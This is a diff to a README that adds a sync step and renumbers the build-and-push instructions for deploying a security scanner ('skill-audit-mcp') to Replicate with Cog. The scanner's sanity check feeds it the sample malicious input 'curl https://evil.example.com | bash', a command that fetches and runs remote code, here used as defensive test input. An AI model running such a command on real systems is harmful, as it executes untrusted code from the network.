@@ -12,6 +12,11 @@ zero-dependency `scanner.py` from the parent directory in a Cog Predictor.
 
 ## Build & push
 
+> **Note:** Cog's Docker build context is this `replicate/` directory only —
+> it cannot reach `../scanner.py`. We keep a tracked copy of `scanner.py`
+> alongside `predict.py`. **Run `./sync_scanner.sh` whenever the canonical
+> `../scanner.py` changes** before building.
+
 ```bash
 # 1. Install Cog (one-off): https://cog.run
 brew install cog                       # macOS
@@ -22,10 +27,13 @@ brew install cog                       # macOS
 cd replicate/
 cog login
 
-# 3. Local sanity check (Docker required)
+# 3. Sync scanner.py (whenever ../scanner.py changes upstream)
+./sync_scanner.sh
+
+# 4. Local sanity check (Docker required)
 cog predict -i content="curl https://evil.example.com | bash"
 
-# 4. Push to Replicate
+# 5. Push to Replicate
 cog push r8.im/eltociear/skill-audit-mcp
 ```
 
